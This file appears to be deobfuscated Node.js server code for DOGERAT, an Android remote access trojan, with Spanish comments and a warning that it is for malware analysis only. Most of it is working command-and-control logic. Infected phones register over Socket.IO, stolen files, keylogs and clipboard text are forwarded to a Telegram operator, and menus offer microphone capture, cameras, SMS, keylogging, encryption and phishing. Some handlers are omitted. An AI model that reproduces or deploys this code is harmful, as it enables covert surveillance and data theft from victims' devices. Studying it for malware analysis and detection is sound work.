// El código desofuscado corresponde a un Remote Access Trojan (RAT)
// que utiliza Telegram como interfaz de comando y control (C2),
// y Socket.IO para la comunicación en tiempo real con dispositivos Android.

// -----------------------------------------------------
// ⚠️ ADVERTENCIA: Este código tiene fines educativos y de análisis de malware.
// NO debe ser ejecutado ni utilizado con fines maliciosos.
// -----------------------------------------------------

// Dependencias de Node.js
const express = require('express'),
    http = require('http'),
    {
        Server
    } = require('socket.io'),
    TelegramBot = require('node-telegram-bot-api'),
    fs = require('fs'),
    multer = require('multer');

// --- Configuración y Inicialización ---

// Variables de entorno (Token del Bot de Telegram y Puerto)
const bot = new TelegramBot(process.env.token, {
    polling: !![]
});
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Almacenamiento de dispositivos conectados y acciones en curso
const connectedDevices = new Map();
const currentActions = new Map();

// Configuración de almacenamiento para archivos subidos (fotos, keylogs, etc.)
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'file');
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({
    storage: storage
});

// Middleware para servir archivos estáticos (el cliente web del RAT, si existe)
app.use(express.static('HTML'));

// Ruta para subir archivos desde el dispositivo Android
app.post('/upload', upload.single('file'), (req, res) => {
    // Manejo de la subida de archivos (imágenes, audios)
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a' + '𝚏𝚒𝚕𝚎 𝚗𝚊𝚖𝚎 → ' + req.file.originalname + '\x0a𝚜𝚒𝚣𝚎 → ' + req.file.size + ' 𝙱\x0a𝚞𝚛𝚕 → ' + req.file.url + '\x0a', {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

// Ruta para recibir texto (captura de portapapeles, keylogger)
app.post('/text', (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + req.body.text, {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

// Manejo de conexiones Socket.IO (dispositivos Android)
io.on('connection', socket => {
    const deviceId = socket.handshake.headers['currentTarget'];
    const model = socket.handshake.headers['model'];
    const version = socket.handshake.headers['version'];
    const time = socket.handshake.headers['time'];
    const ip = socket.handshake.headers['host'];

    if (!connectedDevices.get(deviceId)) {
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: version,
            time: time,
            ip: ip,
            currentAction: 'no information',
            chatId: ''
        });
        try {
            JSON.parse(fs.readFileSync('./data.json', 'utf8')).forEach(chatId => {
                connectedDevices.get(deviceId).chatId = chatId;
                bot.sendMessage(chatId, '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + time + '\x0a<b>𝚒𝚙</b> → ' + ip + '\x0a\x0a', {
                    parse_mode: 'HTML'
                });
            });
        } catch (e) {
            console.log('error: ' + e);
        }
    }

    // Manejo de la desconexión
    socket.on('disconnect', () => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + device.model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + device.version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + device.time + '\x0a<b>𝚒𝚙</b> → ' + device.ip + '\x0a\x0a', {
                parse_mode: 'HTML'
            });
            connectedDevices.delete(deviceId);
        }
    });

    // Respuesta del dispositivo (para acciones específicas)
    socket.on('commend', data => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, data, {
                parse_mode: 'HTML'
            });
            device.currentAction = 'no information';
        }
    });
});

// --- Lógica del Bot de Telegram (Comandos) ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text) {
        // Inicialización y persistencia del Chat ID (quién es admin)
        let admins = [];
        try {
            admins = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
        } catch (e) {
            fs.writeFileSync('./data.json', '[]', 'utf8');
        }
        if (!admins.includes(chatId)) {
            admins.push(chatId);
            fs.writeFileSync('./data.json', JSON.stringify(admins), 'utf8');
        }

        const deviceCount = connectedDevices.size;
        const currentDevice = connectedDevices.get(currentActions.get(chatId));

        if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
            // Mostrar menú principal
            bot.sendMessage(chatId, '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\x0a\x0a' + '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + deviceCount + '</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });

        } else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
            // Listar dispositivos
            if (deviceCount > 0) {
                let deviceList = [];
                connectedDevices.forEach((device, id) => {
                    deviceList.push(id + ' ' + device.model);
                    deviceList.push(device.model);
                });

                bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\x0a\x0a', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙰𝚕𝚕 ✯'],
                            ...deviceList.map(name => [name]),
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: !![]
                    }
                });
            } else {
                bot.sendMessage(chatId, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\x0a\x0a', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: !![]
                    }
                });
            }
        } else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
            // Menú de acciones globales
            bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
                        ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                        ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                        ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                        ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
                        ['✯ 𝚂𝙼𝚂 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
                        ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                        ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                        ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                        ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯'],
                        ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                        ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });
        } else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
            // Información del bot
            bot.sendMessage(chatId, 'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\x0a𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\x0a\x0a' + '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX\x0a\x0a' + '<b>✯ If you want to hire us for any paid work please contack @sphanter\x0a𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\x0a\x0a𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\x0aADMIN → @SPHANTER</b>\x0a\x0a', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                    ],
                    resize_keyboard: !![]
                }
            });
        }
        // --- Comandos de acción (requieren un dispositivo seleccionado) ---
        else if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
            // ... Emitir comando 'screenshot'
        } else if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
            // Pedir duración de micrófono
            currentActions.set(chatId, 'microphoneDuration');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a', {
                parse_mode: 'HTML'
            });
        }
        // ... (resto de comandos de acción directa, como 'contacts', 'calls', 'clipboard' que omití por brevedad en este ejemplo)

        // --- Manejo de la entrada del usuario (después de una acción) ---
        else if (currentActions.get(chatId) === 'microphoneDuration') {
            // Recibir duración y ejecutar 'microphone'
            if (parseInt(text)) {
                currentDevice.socket.emit('microphone', {
                    duration: parseInt(text)
                });
                bot.sendMessage(chatId, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\x0a\x0a✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\x0a\x0a', {
                    parse_mode: 'HTML'
                });
                currentActions.set(chatId, 'no information');
            }
        }
        // ... (resto de manejo de entrada del usuario para SMS, vibrar, toast, etc.)
        else {
            // Seleccionar dispositivo
            let deviceSelected = null;
            connectedDevices.forEach((device, id) => {
                if (text === device.model) {
                    currentActions.set(chatId, id);
                    deviceSelected = device;
                }
            });
            if (deviceSelected) {
                bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + deviceSelected.model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
                            ['✯ 𝚂𝙼𝚂 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: !![]
                    }
                });
            }
        }
    }
});

// Iniciar el servidor Express/Socket.IO
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});
